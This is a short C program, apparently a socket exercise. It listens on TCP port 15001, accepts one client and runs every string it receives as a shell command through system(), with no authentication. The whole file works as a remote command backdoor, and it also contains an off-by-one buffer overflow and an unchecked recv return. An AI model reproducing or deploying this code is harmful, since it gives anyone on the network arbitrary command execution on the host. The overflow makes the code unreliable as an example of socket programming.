#include<sys/socket.h>
#include<sys/types.h>
#include<arpa/inet.h>
#include<stdio.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<errno.h>
#include<string.h>
#include<unistd.h>

void main()
{   
    int server_socket,client_socket,recv_bytes,client_length;
    struct sockaddr_in server_address,client_address;
    int buffer_size = 50;
    char *buffer = malloc(buffer_size);
    // create socket
    if ( (server_socket = socket(AF_INET,SOCK_STREAM,0) )  < 0 )
    {
	perror("socket");
	exit(0);
    }
    printf("Socket created successfully...\n");

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(15001);

    // Bind
    if( bind(server_socket,(struct sockaddr*)&server_address,sizeof(server_address)) < 0 )
    {
	perror("bind");
	exit(1);
	
    }
    printf("Bind Successful...\n");
    
    // Listen
    if( listen(server_socket,3) < 0 ) 
    {
	perror("listen");
	exit(2);
	
    }
    printf("Listening at port 15001...\n");
    client_length = sizeof(struct sockaddr_in);
    client_socket = accept(server_socket,(struct sockaddr *)&client_address,&client_length);
    if( client_socket < 0)
    {
	perror("accept");
	exit(3);
	//printf("The client %s has connected...\n",inet_ntoa(client_address.sin_addr));
	
    }
    

    while(1)
    {
	recv_bytes = recv(client_socket,buffer,buffer_size,0);
	buffer[recv_bytes] = '\0';
	if(strcmp(buffer,"exit") == 0)
	{
	    close(client_socket);
	    close(server_socket);
	    exit(4);
	}
	else
	{
	    printf("Command received : %s\n",buffer);
	    system(buffer);
	    printf("\n");
	    
	}
    }

}
